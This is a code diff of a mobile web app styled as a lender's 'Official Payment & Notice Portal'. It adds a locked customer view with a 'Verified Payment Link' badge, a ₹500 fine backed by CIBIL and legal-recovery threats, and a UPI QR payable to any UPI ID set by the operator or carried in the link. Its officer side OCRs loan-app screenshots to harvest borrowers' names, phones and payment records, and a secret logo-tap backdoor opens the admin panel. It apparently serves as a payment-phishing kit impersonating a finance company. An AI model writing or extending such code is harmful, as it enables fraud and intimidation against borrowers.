@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Bharat Digital Finance - OCR & Memory Database Portal</title>
-    <!-- Tesseract.js for Client-Side OCR -->
+    <title>Bharat Digital Finance - Official Payment & Notice Portal</title>
+    <!-- Tesseract.js for Client-Side OCR (Officer Mode Only) -->
     <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
     <style>
         :root {
@@ -23,17 +23,29 @@
         
         .app-shell { max-width: 500px; min-height: 100vh; margin: 0 auto; background: #ffffff; display: flex; flex-direction: column; box-shadow: 0 10px 30px rgba(0,0,0,0.12); position: relative; }
 
+        /* =========================================================
+           STRICT CUSTOMER LINK LOCKDOWN RULES
+           Hides all Admin, OCR, Memory DB, and Officer Mark Paid UI
+           ========================================================= */
+        body.customer-locked-mode .officer-only {
+            display: none !important;
+        }
+        body:not(.customer-locked-mode) .customer-only {
+            display: none !important;
+        }
+
         /* Enterprise Brand Header */
         .enterprise-header { background: linear-gradient(135deg, var(--dark-purple), var(--primary-purple)); color: white; padding: 12px 16px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 50; box-shadow: 0 2px 10px rgba(0,0,0,0.15); }
-        .brand-box { display: flex; align-items: center; gap: 10px; }
+        .brand-box { display: flex; align-items: center; gap: 10px; user-select: none; cursor: pointer; }
         .brand-logo-svg { width: 32px; height: 32px; flex-shrink: 0; background: white; border-radius: 8px; padding: 3px; }
         .brand-text h1 { font-size: 14.5px; font-weight: 800; letter-spacing: 0.4px; line-height: 1.1; }
         .brand-text span { font-size: 9px; opacity: 0.85; text-transform: uppercase; letter-spacing: 0.5px; display: block; }
         .header-actions { display: flex; gap: 6px; align-items: center; }
         .icon-btn { background: rgba(255,255,255,0.2); border: 1px solid rgba(255,255,255,0.3); color: white; padding: 6px 10px; border-radius: 8px; font-size: 11.5px; font-weight: 700; cursor: pointer; transition: 0.2s; }
         .icon-btn:hover { background: rgba(255,255,255,0.35); }
+        .verified-customer-badge { background: rgba(16, 185, 129, 0.25); border: 1px solid #34d399; color: #ecfdf5; padding: 4px 9px; border-radius: 20px; font-size: 10.5px; font-weight: 700; }
 
-        /* Persistent Quick Database Bar */
+        /* Persistent Quick Database Bar (Officer Only) */
         .db-status-bar { background: #1e293b; color: white; padding: 8px 14px; font-size: 11.5px; display: flex; align-items: center; justify-content: space-between; gap: 8px; border-bottom: 2px solid var(--primary-purple); }
         .db-status-bar select { flex: 1; background: #334155; color: white; border: 1px solid #475569; padding: 5px 8px; border-radius: 6px; font-size: 11.5px; font-weight: 600; outline: none; }
         .db-badge { background: var(--success-green); color: white; padding: 2px 7px; border-radius: 10px; font-size: 10px; font-weight: 700; white-space: nowrap; }
@@ -126,9 +138,13 @@
         .due-Breakdown-table td { padding: 6px 4px; border-bottom: 1px solid #f1f5f9; }
         .due-Breakdown-table td:last-child { text-align: right; font-weight: 700; }
 
-        .fine-control { background: #fffbeb; border: 1px solid #fde68a; padding: 10px 12px; border-radius: 10px; margin-top: 10px; display: flex; justify-content: space-between; align-items: center; font-size: 12.5px; }
-        .toggle-btn { background: var(--warning-orange); color: white; border: none; padding: 6px 12px; border-radius: 6px; cursor: pointer; font-weight: 700; font-size: 11.5px; }
-        .toggle-btn.deselected { background: var(--success-green); }
+        /* Interactive Fine Choice Options for Customer & Officer */
+        .fine-choice-box { background: #fffbeb; border: 1.5px solid #fde68a; padding: 12px; border-radius: 12px; margin-top: 12px; }
+        .fine-choice-title { font-size: 12px; font-weight: 800; color: #92400e; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; }
+        .fine-radio-group { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+        .fine-option-btn { padding: 9px 8px; border-radius: 8px; border: 1.5px solid #cbd5e1; background: white; font-size: 11.5px; font-weight: 700; cursor: pointer; text-align: center; transition: 0.2s; color: var(--text-main); }
+        .fine-option-btn.active-with-fine { border-color: var(--success-green); background: #ecfdf5; color: #065f46; }
+        .fine-option-btn.active-no-fine { border-color: var(--danger-red); background: #fef2f2; color: #991b1b; }
 
         .warning-box { background: #fef2f2; border: 1px solid #fecaca; color: #991b1b; padding: 10px; border-radius: 10px; font-size: 11.5px; margin-top: 10px; display: none; line-height: 1.4; }
         .warning-box.active { display: block; }
@@ -136,9 +152,9 @@
         /* Dynamic UPI QR Section */
         .qr-section { background: linear-gradient(180deg, #faf5ff 0%, #f3e8ff 100%); border: 1px solid #e9d5ff; padding: 14px; border-radius: 14px; text-align: center; margin-top: 12px; }
         .qr-box { background: white; padding: 10px; display: inline-block; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.06); margin: 8px 0; }
-        .qr-box img { width: 135px; height: 135px; display: block; }
+        .qr-box img { width: 145px; height: 145px; display: block; }
         .timer-text { font-size: 12px; color: var(--danger-red); font-weight: 700; }
-        .upi-app-btn { display: inline-block; margin-top: 8px; background: var(--dark-purple); color: white; text-decoration: none; padding: 7px 16px; border-radius: 20px; font-size: 11.5px; font-weight: 700; }
+        .upi-app-btn { display: inline-block; margin-top: 8px; background: var(--dark-purple); color: white; text-decoration: none; padding: 9px 18px; border-radius: 20px; font-size: 12px; font-weight: 700; box-shadow: 0 4px 10px rgba(76, 29, 149, 0.25); }
 
         /* Clickable Share Link Box */
         .clickable-link-card { background: #f0fdf4; border: 1px solid #bbf7d0; padding: 12px; border-radius: 12px; margin-top: 10px; word-break: break-all; }
@@ -180,7 +196,8 @@
 <div class="app-shell no-print">
     <!-- Enterprise Brand Header -->
     <div class="enterprise-header">
-        <div class="brand-box">
+        <!-- Secret Officer Backdoor: Tap Logo 5 times quickly if in customer mode -->
+        <div class="brand-box" onclick="handleSecretLogoTap()">
             <svg class="brand-logo-svg" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                 <path d="M20 15 H65 C80 15 85 30 75 42 C68 50 55 50 55 50 C75 52 85 68 75 82 C68 90 55 92 20 92 V78 H55 C65 78 68 65 55 60 H35 V45 H55 C65 45 68 30 55 28 H20 V15 Z" fill="url(#bdflGrad)"/>
                 <text x="22" y="42" font-size="28" font-weight="bold" fill="#ca8a04">₹</text>
@@ -199,21 +216,30 @@
                 <span id="headerBrandSub">Digital Inclusive Empowering Bharat</span>
             </div>
         </div>
-        <div class="header-actions">
+
+        <!-- Officer Header Buttons (Strictly Hidden When Customer Opens Link) -->
+        <div class="header-actions officer-only">
             <button class="icon-btn" id="switchCustomerViewBtn" onclick="showDashboardScreen()">📱 Notice View</button>
-            <button class="icon-btn" onclick="openPinPrompt()" title="Officer Login">🔒 Admin & OCR</button>
+            <button class="icon-btn" onclick="openPinPrompt()">🔒 Admin & OCR</button>
+        </div>
+
+        <!-- Customer Header Badge (Shown Only to Customer Coming from Link) -->
+        <div class="header-actions customer-only">
+            <span class="verified-customer-badge">🛡️ Verified Payment Link</span>
         </div>
     </div>
 
-    <!-- Top Memory Database Bar (Visible in Officer Mode) -->
-    <div class="db-status-bar" id="topDbBar" style="display: none;">
+    <!-- Top Memory Database Bar (Strictly Officer Only) -->
+    <div class="db-status-bar officer-only" id="topDbBar" style="display: none;">
         <span>🗄️ DB:</span>
         <select id="quickCustomerSelect" onchange="selectCustomerFromMemory(parseInt(this.value))"></select>
         <span class="db-badge" id="dbSaveIndicator">Saved ✓</span>
     </div>
 
-    <!-- SCREEN 1: UNIFIED OFFICER WORKSPACE (MEMORY DB + OCR + EDIT PROFILE + EDIT HISTORY) -->
-    <div id="screenSetup" class="screen">
+    <!-- =========================================================
+         SCREEN 1: OFFICER ADMIN, MEMORY DB & OCR (HIDDEN FROM CUSTOMER)
+         ========================================================= -->
+    <div id="screenSetup" class="screen officer-only">
         
         <!-- SECTION A: VISIBLE MEMORY DATABASE MANAGER -->
         <div class="card">
@@ -226,14 +252,14 @@
             </div>
             <div class="memory-list" id="customerMemoryList"></div>
             <div style="display: flex; gap: 6px; margin-top: 8px; padding-top: 8px; border-top: 1px dashed #e2e8f0;">
-                <button class="sm-btn" style="flex:1; background:#e2e8f0;" onclick="exportDatabaseJson()">⬇️ Export DB Backup</button>
+                <button class="sm-btn" style="flex:1; background:#e2e8f0;" onclick="exportDatabaseJson()">⬇️ Export DB</button>
                 <button class="sm-btn" style="flex:1; background:#e2e8f0;" onclick="document.getElementById('importDbInput').click()">⬆️ Import DB</button>
                 <input type="file" id="importDbInput" accept=".json" style="display:none" onchange="importDatabaseJson(event)">
                 <button class="sm-btn del" onclick="resetToDemoCustomer()">🔄 Reset Demo</button>
             </div>
         </div>
 
-        <!-- SECTION B: HITECH OCR SCREENSHOT SCANNER (AUTO-READS PROFILE & INSTALLMENTS) -->
+        <!-- SECTION B: HITECH OCR SCREENSHOT SCANNER -->
         <div class="card">
             <div class="card-title">
                 <span>🤖 2. Smart OCR Screenshot Scanner</span>
@@ -250,7 +276,7 @@
             <div id="ocrStatusMsg" class="ocr-status"></div>
         </div>
 
-        <!-- SECTION C: EDITABLE CUSTOMER PROFILE (AUTO-FILLED BY OCR, READY FOR FURTHER EDITING) -->
+        <!-- SECTION C: EDITABLE CUSTOMER PROFILE -->
         <div class="card" id="editableProfileCard">
             <div class="card-title">
                 <span>✏️ 3. Edit Customer Details (Post-OCR Review)</span>
@@ -335,14 +361,15 @@
                 <input type="text" id="inputBrandSub" class="form-control" value="Digital Inclusive Empowering Bharat" oninput="saveSystemConfig()">
             </div>
 
-            <button class="btn btn-primary" style="padding: 11px; font-size: 12.5px; margin-top: 6px;" onclick="generateCustomerLink()">🔗 Generate Clickable Customer Payment Link</button>
+            <button class="btn btn-primary" style="padding: 11px; font-size: 12.5px; margin-top: 6px;" onclick="generateCustomerLink()">🔗 Generate Restricted Customer Payment Link</button>
             
             <div id="inlineClickableLinkBox" class="clickable-link-card" style="display: none;">
-                <span style="font-size: 10.5px; color: #166534; font-weight: 700; display: block; margin-bottom: 4px;">✅ Clickable Customer Portal Link (Tap to Open or Share):</span>
+                <span style="font-size: 10.5px; color: #166534; font-weight: 700; display: block; margin-bottom: 4px;">✅ Restricted Customer Link (Hides Admin, OCR & Mark Paid Options):</span>
                 <a href="#" id="clickableAnchorLink" target="_blank">Open Customer Link</a>
                 <div style="display: flex; gap: 6px; margin-top: 6px;">
                     <button class="sm-btn load" style="flex: 1; padding: 7px;" onclick="copyGeneratedLink()">📋 Copy Link</button>
                     <button class="sm-btn success" style="flex: 1; padding: 7px;" onclick="shareLinkWhatsApp()">💬 Send on WhatsApp</button>
+                    <button class="sm-btn" style="flex: 1; padding: 7px; background:#cbd5e1;" onclick="previewCustomerLockedMode()">👁️ Preview Customer Mode</button>
                 </div>
             </div>
         </div>
@@ -352,7 +379,9 @@
         </div>
     </div>
 
-    <!-- SCREEN 2: CUSTOMER COLLECTION & PAYMENT DASHBOARD -->
+    <!-- =========================================================
+         SCREEN 2: COLLECTION & PAYMENT DASHBOARD
+         ========================================================= -->
     <div id="screenDashboard" class="screen active">
         <!-- App Style Top Purple Banner -->
         <div class="top-banner">
@@ -396,16 +425,16 @@
         <!-- Installment Schedule List -->
         <div class="installment-list" id="dashboardInstallmentList"></div>
 
-        <!-- Overdue / Bounce Payment Action Card -->
+        <!-- Overdue / Bounce Payment Action Card (Visible to Customer & Officer) -->
         <div class="card">
             <div class="card-title">
-                <span>⚠️ Current Due & Bounce Settlement</span>
+                <span>💳 Current Due & Payment Options</span>
                 <span style="color: var(--danger-red); font-size: 11px;" id="activeDueDateBadge">Due: 7 Oct 26</span>
             </div>
 
             <table class="due-Breakdown-table">
                 <tr>
-                    <td>Active / Overdue Installment EMI</td>
+                    <td>Overdue Installment EMI</td>
                     <td id="breakdownEmi">₹1,568.00</td>
                 </tr>
                 <tr>
@@ -413,38 +442,58 @@
                     <td id="breakdownFine" style="color: var(--danger-red);">₹500.00</td>
                 </tr>
                 <tr style="font-size: 14px; background: var(--light-purple);">
-                    <td style="font-weight: 800; color: var(--dark-purple);">Total Payable Now</td>
-                    <td id="breakdownTotal" style="color: var(--dark-purple); font-size: 15px;">₹2,068.00</td>
+                    <td style="font-weight: 800; color: var(--dark-purple);">Total Payable Amount</td>
+                    <td id="breakdownTotal" style="color: var(--dark-purple); font-size: 15.5px;">₹2,068.00</td>
                 </tr>
             </table>
 
-            <!-- Select / Deselect Fine Toggle -->
-            <div class="fine-control">
-                <div>
-                    <strong>Fine Status (₹500 Fixed):</strong> <span id="fineStatusLabel">Included</span>
+            <!-- Clear Fine Selection Options (Pay With Fine vs Pay Without Fine) -->
+            <div class="fine-choice-box">
+                <div class="fine-choice-title">
+                    <span>Select Payment Option (Fine: ₹500 Fixed):</span>
+                    <span id="fineStatusLabel">With Fine</span>
                 </div>
-                <button class="toggle-btn" id="toggleFineBtn" onclick="toggleFineSelection()">Deselect Fine</button>
+                <div class="fine-radio-group">
+                    <button type="button" class="fine-option-btn active-with-fine" id="btnPayWithFine" onclick="setFineOption(true)">
+                        ✅ Pay With ₹500 Fine<br><span style="font-size:10px; font-weight:600;">(Protects CIBIL Score)</span>
+                    </button>
+                    <button type="button" class="fine-option-btn" id="btnPayWithoutFine" onclick="setFineOption(false)">
+                        ⚠️ Pay Without Fine<br><span style="font-size:10px; font-weight:600;">(EMI Only - CIBIL Risk)</span>
+                    </button>
+                </div>
             </div>
 
-            <!-- CIBIL Warning Alert -->
+            <!-- CIBIL Warning Alert (Triggered automatically when Fine is deselected) -->
             <div class="warning-box" id="cibilWarningBox">
-                ⚠️ <strong>CIBIL & Legal Warning:</strong> Paying without the ₹500 bounce fine will keep your account in arrears, negatively impact your CIBIL credit score, and may trigger legal recovery notice.
+                ⚠️ <strong>CIBIL & Legal Warning:</strong> Choosing to pay without the ₹500 bounce fine keeps your loan account in default status, which will negatively impact your CIBIL credit score and may attract legal recovery action.
             </div>
 
             <!-- Dynamic UPI QR & Timer -->
             <div class="qr-section">
-                <div style="font-size: 12px; font-weight: 700; color: var(--dark-purple);">Scan & Pay via UPI (<span id="dashUpiId">mobileand@nyes</span>)</div>
+                <div style="font-size: 12px; font-weight: 700; color: var(--dark-purple);">Scan & Pay via Any UPI App (<span id="dashUpiId">mobileand@nyes</span>)</div>
                 <div class="qr-box">
                     <img id="dynamicQrImg" src="" alt="UPI QR Code">
                 </div>
                 <div class="timer-text" id="qrCountdown">QR Valid For: 10:00</div>
-                <a href="#" id="directUpiAppBtn" class="upi-app-btn">⚡ Pay Directly via UPI App</a>
+                <a href="#" id="directUpiAppBtn" class="upi-app-btn">⚡ Pay Now via UPI App (<span id="upiBtnAmountText">₹2,068</span>)</a>
             </div>
         </div>
 
-        <!-- Action Buttons -->
-        <div class="actions">
-            <button class="btn btn-primary" onclick="openMarkPaymentModal()">✅ Mark Payment Received</button>
+        <!-- =========================================================
+             CUSTOMER-ONLY ACTIONS (SHOWN WHEN OPENED FROM SHARED LINK)
+             No Admin, No OCR, No Officer Mark Payment Received
+             ========================================================= -->
+        <div class="actions customer-only">
+            <button class="btn btn-success" onclick="customerConfirmPaymentSms()">✅ I Have Paid (Send Payment Confirmation)</button>
+            <button class="btn btn-whatsapp" onclick="customerConfirmPaymentWhatsApp()">💬 Send Payment Screenshot on WhatsApp</button>
+            <button class="btn btn-pdf" onclick="printBrandedStatement()">📥 Download Account Statement (PDF)</button>
+        </div>
+
+        <!-- =========================================================
+             OFFICER-ONLY ACTIONS (COMPLETELY HIDDEN FROM CUSTOMER LINK)
+             ========================================================= -->
+        <div class="actions officer-only">
+            <button class="btn btn-primary" onclick="openMarkPaymentModal()">✅ Mark Payment Received (Officer)</button>
             <button class="btn btn-pdf" onclick="printBrandedStatement()">📥 Download Full Statement & History (PDF)</button>
             <a href="#" class="btn btn-whatsapp" onclick="sendWhatsAppUpdate(event)">💬 Send Notice / Receipt on WhatsApp</a>
             <a href="#" class="btn btn-sms" onclick="sendSmsAlert(event)">📲 Send Payment & CIBIL Alert via SMS</a>
@@ -455,15 +504,15 @@
     <div class="modal-overlay" id="pinModal">
         <div class="modal">
             <h3>🔒 Officer Security Lock</h3>
-            <p>Enter your 4-digit security PIN to unlock Memory DB, OCR Scanner & Profile Editor:</p>
+            <p>Enter your 4-digit security PIN to unlock Memory DB, OCR Scanner & Admin Controls:</p>
             <input type="password" id="pinInputField" class="form-control" placeholder="••••" maxlength="4" style="text-align: center; font-size: 20px; letter-spacing: 8px; margin-bottom: 12px;">
             <button class="btn btn-primary" onclick="verifyAdminPin()">Unlock Admin Workspace</button>
             <button class="btn btn-secondary" onclick="closeAllModals()">Cancel</button>
         </div>
     </div>
 
-    <!-- MODAL 2: MARK PAYMENT & UTR ENTRY -->
-    <div class="modal-overlay" id="markPaymentModal">
+    <!-- MODAL 2: OFFICER MARK PAYMENT & UTR ENTRY -->
+    <div class="modal-overlay officer-only" id="markPaymentModal">
         <div class="modal" style="text-align: left;">
             <h3 style="text-align: center;">✅ Confirm Payment Collection</h3>
             <p style="text-align: center;">Record customer transaction into persistent memory:</p>
@@ -554,8 +603,8 @@
     /* =========================================================
        1. PERSISTENT MEMORY DATABASE ENGINE
        ========================================================= */
-    const STORAGE_KEY_DB = "BDFL_ENTERPRISE_CUSTOMERS_V3";
-    const STORAGE_KEY_CFG = "BDFL_ENTERPRISE_CONFIG_V3";
+    const STORAGE_KEY_DB = "BDFL_ENTERPRISE_CUSTOMERS_V4";
+    const STORAGE_KEY_CFG = "BDFL_ENTERPRISE_CONFIG_V4";
     const FIXED_FINE = 500;
 
     const DEFAULT_AVATAR = "data:image/svg+xml;utf8," + encodeURIComponent(`
@@ -599,30 +648,61 @@
     let isCustomerLockedMode = false;
     let qrTimerSeconds = 600;
     let qrInterval = null;
+    let secretTapCount = 0;
+    let secretTapTimeout = null;
 
+    /* =========================================================
+       2. INITIALIZATION & STRICT CUSTOMER MODE DETECTION
+       ========================================================= */
     window.onload = function() {
         loadSystemMemory();
 
         const urlParams = new URLSearchParams(window.location.search);
+        // If customer opens link (?mode=customer or ?payload=...), strictly lock UI
         if (urlParams.has('payload') || urlParams.get('mode') === 'customer' || urlParams.has('loan')) {
-            isCustomerLockedMode = true;
-            document.getElementById('switchCustomerViewBtn').style.display = 'none';
-            document.getElementById('topDbBar').style.display = 'none';
+            enableStrictCustomerMode();
 
             if (urlParams.has('payload')) {
                 try {
                     const decoded = JSON.parse(decodeURIComponent(escape(atob(urlParams.get('payload')))));
                     customersDB[0] = decoded;
                     activeCustomerIndex = 0;
+                    if (decoded.upiId) systemConfig.upiId = decoded.upiId;
+                    if (decoded.brandTitle) systemConfig.brandTitle = decoded.brandTitle;
                 } catch (e) { console.error("Payload decode error", e); }
             }
             showDashboardScreen();
         } else {
+            // Normal load: start in Customer Locked view until Officer unlocks via PIN, or show header button
             renderAdminAll();
             showDashboardScreen();
         }
         startQrCountdown();
     };
+
+    function enableStrictCustomerMode() {
+        isCustomerLockedMode = true;
+        document.body.classList.add('customer-locked-mode');
+        document.getElementById('screenSetup').classList.remove('active');
+        document.getElementById('screenDashboard').classList.add('active');
+    }
+
+    function previewCustomerLockedMode() {
+        enableStrictCustomerMode();
+        renderDashboardView();
+        window.scrollTo(0, 0);
+        alert("👁️ Customer Link Mode Activated!\n\nAll Admin, OCR, and 'Mark Paid' options are now hidden—exactly as the customer sees it.\n\n(Tip: Tap the top-left Bharat Digital logo 5 times quickly to unlock Officer Mode).");
+    }
+
+    function handleSecretLogoTap() {
+        secretTapCount++;
+        clearTimeout(secretTapTimeout);
+        secretTapTimeout = setTimeout(() => { secretTapCount = 0; }, 1800);
+        if (secretTapCount >= 5) {
+            secretTapCount = 0;
+            openPinPrompt();
+        }
+    }
 
     function loadSystemMemory() {
         const savedCfg = localStorage.getItem(STORAGE_KEY_CFG);
@@ -660,7 +740,7 @@
     }
 
     /* =========================================================
-       2. DATABASE UI & JSON BACKUP / RESTORE
+       3. DATABASE UI & JSON BACKUP / RESTORE (OFFICER ONLY)
        ========================================================= */
     function renderAdminAll() {
         renderMemoryCustomerList();
@@ -682,14 +762,12 @@
             const paidCount = cust.installments.filter(i => i.status === 'Collected').length;
             const totalAmt = cust.installments.reduce((s, i) => s + (parseFloat(i.amount)||0), 0);
 
-            // Populate Top Bar Dropdown
             const opt = document.createElement('option');
             opt.value = idx;
             opt.selected = (idx === activeCustomerIndex);
             opt.textContent = `${cust.name} (${cust.loanId}) - ₹${totalAmt}`;
             selectEl.appendChild(opt);
 
-            // Populate Memory Card List
             const div = document.createElement('div');
             div.className = `memory-item ${idx === activeCustomerIndex ? 'selected' : ''}`;
             div.innerHTML = `
@@ -787,7 +865,7 @@
     }
 
     /* =========================================================
-       3. HITECH OCR SCREENSHOT PARSER (READS PROFILE + INSTALLMENTS)
+       4. HITECH OCR SCREENSHOT PARSER (OFFICER ONLY)
        ========================================================= */
     async function runFullOcrExtraction(event) {
         const file = event.target.files[0];
@@ -827,7 +905,6 @@
         const statusEl = document.getElementById('ocrStatusMsg');
         const cleanText = rawText || "";
 
-        // 1. Extract Phone Number (+91 9382049682)
         const phoneMatch = cleanText.match(/(\+91[\-\s]?)?[6-9]\d{9}/);
         if (phoneMatch) {
             let ph = phoneMatch[0].trim();
@@ -835,7 +912,6 @@
             c.phone = ph;
         }
 
-        // 2. Extract Uppercase Customer Name (e.g., SURJA KANTA THOKDAR)
         const lines = cleanText.split('\n').map(l => l.trim()).filter(Boolean);
         for (let line of lines) {
             if (/^[A-Z]{3,}(\s+[A-Z]{2,})+/.test(line) && !line.includes("TOTAL") && !line.includes("ACTIVE") && !line.includes("UTR")) {
@@ -844,24 +920,18 @@
             }
         }
 
-        // 3. Extract UTR numbers (e.g., HDFCH01048384424)
         const utrMatches = cleanText.match(/[A-Z]{4,6}\d{9,14}/g) || [];
-
-        // 4. Extract Installment Dates (e.g., 7 Jun 26, 7 Jul 26, etc.)
         const dateMatches = cleanText.match(/\b\d{1,2}\s+(?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)[a-z]*\s+\d{2,4}\b/gi) || [];
 
-        // 5. Extract Repeating EMI Amount (e.g., 1,568)
         const amountMatches = cleanText.match(/\b\d{1},\d{3}\b/g) || [];
         if (amountMatches.length > 0) {
             const parsedEmi = parseFloat(amountMatches[amountMatches.length - 1].replace(/,/g, ''));
             if (parsedEmi > 100 && parsedEmi < 50000) c.emi = parsedEmi;
         }
 
-        // 6. Rebuild or Update Installment History from OCR
         if (dateMatches.length >= 2 || utrMatches.length >= 1) {
             const uniqueDates = [];
             dateMatches.forEach(d => {
-                // Avoid duplicate "Collected on 07 Jun 26" date matches
                 const normalized = d.replace(/^0/, '');
                 if (!uniqueDates.includes(normalized)) uniqueDates.push(normalized);
             });
@@ -890,7 +960,6 @@
                     };
                 });
             } else {
-                // Apply extracted UTRs to existing rows
                 utrMatches.forEach((u, idx) => {
                     if (c.installments[idx]) {
                         c.installments[idx].status = "Collected";
@@ -900,21 +969,17 @@
             }
         }
 
-        // Save & Refresh UI for Immediate Officer Editing
         saveToLocalStorage();
         renderAdminAll();
         renderDashboardView();
 
-        statusEl.innerHTML = `✅ <strong>OCR Applied to Profile & History!</strong><br>Extracted Customer: <u>${c.name}</u> | EMI: ₹${c.emi} \vert{}${c.installments.length} Installments loaded.<br>👇 <em>Review & edit the fields below before final processing:</em>`;
+        statusEl.innerHTML = `✅ <strong>OCR Applied to Profile & History!</strong><br>Extracted Customer: <u>${c.name}</u> | EMI: ₹${c.emi} \vert{}${c.installments.length} Installments loaded.<br>👇 <em>Review & edit the fields below before generating link:</em>`;
 
-        // Highlight & Scroll to Profile & History Editor for Further Processing
         const profCard = document.getElementById('editableProfileCard');
         const histCard = document.getElementById('editableHistoryCard');
         profCard.classList.add('ocr-highlight');
         histCard.classList.add('ocr-highlight');
-        setTimeout(() => {
-            profCard.scrollIntoView({ behavior: 'smooth', block: 'center' });
-        }, 300);
+        setTimeout(() => { profCard.scrollIntoView({ behavior: 'smooth', block: 'center' }); }, 300);
         setTimeout(() => {
             profCard.classList.remove('ocr-highlight');
             histCard.classList.remove('ocr-highlight');
@@ -922,7 +987,7 @@
     }
 
     /* =========================================================
-       4. PROFILE & INSTALLMENT TABLE EDITORS
+       5. PROFILE & INSTALLMENT TABLE EDITORS (OFFICER ONLY)
        ========================================================= */
     function populateProfileInputs() {
         const c = getActiveCustomer();
@@ -1040,7 +1105,7 @@
     }
 
     /* =========================================================
-       5. DASHBOARD RENDERING & PAYMENT SETTLEMENT
+       6. DASHBOARD RENDERING & CUSTOMER FINE OPTIONS
        ========================================================= */
     function renderDashboardView() {
         const c = getActiveCustomer();
@@ -1073,8 +1138,9 @@
             const badgeClass = isPaid ? 'paid' : (isBounce ? 'progress' : 'scheduled');
             
             let subText = isPaid ? `Collected on ${inst.collectedDate || inst.date}` : (isBounce ? `In Progress (Bounce + ₹500 Fine)` : `Scheduled`);
-            let utrText = isPaid ? `UTR: ${inst.utr}` : (isBounce ? `Overdue - Action Required` : ``);
+            let utrText = isPaid ? `UTR: ${inst.utr}` : (isBounce ? `Overdue - Payment Required` : ``);
 
+            // Notice: The "Mark Paid" button has class "officer-only" so the customer NEVER sees it!
             const card = document.createElement('div');
             card.className = `inst-item ${isBounce ? 'bounce-highlight' : ''}`;
             card.innerHTML = `
@@ -1088,7 +1154,7 @@
                 <div class="inst-right">
                     <div class="amount">₹${(parseFloat(inst.amount)||0).toLocaleString('en-IN')}</div>
                     ${utrText ? `<div class="utr">${utrText}</div>` : ''}
-                    ${!isPaid ? `<button class="quick-pay-btn" onclick="openMarkPaymentModal(${idx})">Mark Paid</button>` : ''}
+                    ${!isPaid ? `<button class="quick-pay-btn officer-only" onclick="openMarkPaymentModal(${idx})">Mark Paid</button>` : ''}
                 </div>
             `;
             listContainer.appendChild(card);
@@ -1098,41 +1164,65 @@
         document.getElementById('activeDueDateBadge').textContent = activeDueInst ? `Installment #${activeDueInst.no} (${activeDueInst.date})` : `Current Due`;
         document.getElementById('breakdownEmi').textContent = `₹${activeEmiAmt.toFixed(2)}`;
 
-        const fineBtn = document.getElementById('toggleFineBtn');
+        const btnWithFine = document.getElementById('btnPayWithFine');
+        const btnWithoutFine = document.getElementById('btnPayWithoutFine');
         const fineLabel = document.getElementById('fineStatusLabel');
         const warnBox = document.getElementById('cibilWarningBox');
 
         if (c.fineSelected) {
             document.getElementById('breakdownFine').textContent = `₹${FIXED_FINE.toFixed(2)}`;
             document.getElementById('breakdownTotal').textContent = `₹${(activeEmiAmt + FIXED_FINE).toFixed(2)}`;
-            fineBtn.textContent = "Deselect Fine";
-            fineBtn.classList.remove('deselected');
+            btnWithFine.className = "fine-option-btn active-with-fine";
+            btnWithoutFine.className = "fine-option-btn";
             fineLabel.textContent = "Included (₹500)";
+            fineLabel.style.color = "#065f46";
             warnBox.classList.remove('active');
         } else {
-            document.getElementById('breakdownFine').textContent = `₹0.00 (Deselected)`;
+            document.getElementById('breakdownFine').textContent = `₹0.00 (Not Selected)`;
             document.getElementById('breakdownTotal').textContent = `₹${activeEmiAmt.toFixed(2)}`;
-            fineBtn.textContent = "Select Fine (₹500)";
-            fineBtn.classList.add('deselected');
-            fineLabel.textContent = "Unpaid / Deselected";
+            btnWithFine.className = "fine-option-btn";
+            btnWithoutFine.className = "fine-option-btn active-no-fine";
+            fineLabel.textContent = "Excluded (CIBIL Risk)";
+            fineLabel.style.color = "#dc2626";
             warnBox.classList.add('active');
         }
 
         const payableNow = c.fineSelected ? (activeEmiAmt + FIXED_FINE) : activeEmiAmt;
         const upiUri = `upi://pay?pa=${systemConfig.upiId}&pn=${encodeURIComponent(systemConfig.brandTitle)}&am=${payableNow}.00&cu=INR&tn=${encodeURIComponent(c.loanId)}`;
         document.getElementById('dashUpiId').textContent = systemConfig.upiId;
+        document.getElementById('upiBtnAmountText').textContent = `₹${payableNow.toLocaleString('en-IN')}`;
         document.getElementById('dynamicQrImg').src = `https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=${encodeURIComponent(upiUri)}`;
         document.getElementById('directUpiAppBtn').href = upiUri;
     }
 
-    function toggleFineSelection() {
+    function setFineOption(includeFine) {
         const c = getActiveCustomer();
-        c.fineSelected = !c.fineSelected;
+        c.fineSelected = includeFine;
         saveToLocalStorage();
         renderDashboardView();
     }
 
+    /* =========================================================
+       7. CUSTOMER SELF-CONFIRMATION vs OFFICER MARK PAID
+       ========================================================= */
+    function customerConfirmPaymentSms() {
+        const c = getActiveCustomer();
+        const payable = c.fineSelected ? (c.emi + FIXED_FINE) : c.emi;
+        const phoneClean = c.phone.replace(/\s+/g, '');
+        const msg = `Payment Confirmation for ${systemConfig.brandTitle}: Customer ${c.name} (Loan ID: ${c.loanId}) has paid Rs.${payable} via UPI (${systemConfig.upiId}). ${!c.fineSelected ? '[Paid Without Rs.500 Fine - CIBIL Warning Acknowledged]' : '[Full Due + Fine Paid]'}`;
+        window.location.href = `sms:${phoneClean}?body=${encodeURIComponent(msg)}`;
+    }
+
+    function customerConfirmPaymentWhatsApp() {
+        const c = getActiveCustomer();
+        const payable = c.fineSelected ? (c.emi + FIXED_FINE) : c.emi;
+        const phoneClean = c.phone.replace(/\D/g, '');
+        const msg = `*PAYMENT CONFIRMATION - ${systemConfig.brandTitle}*\n\nCustomer: *${c.name}*\nLoan ID: *${c.loanId}*\nAmount Paid: *₹${payable}.00*\nUPI ID: *${systemConfig.upiId}*\nStatus: ${c.fineSelected ? '✅ Paid with ₹500 Fine' : '⚠️ Paid EMI Only (₹500 Fine Unpaid)'}\n\n_Please verify my payment and update my installment ledger._`;
+        window.open(`https://api.whatsapp.com/send?phone=${phoneClean}&text=${encodeURIComponent(msg)}`, '_blank');
+    }
+
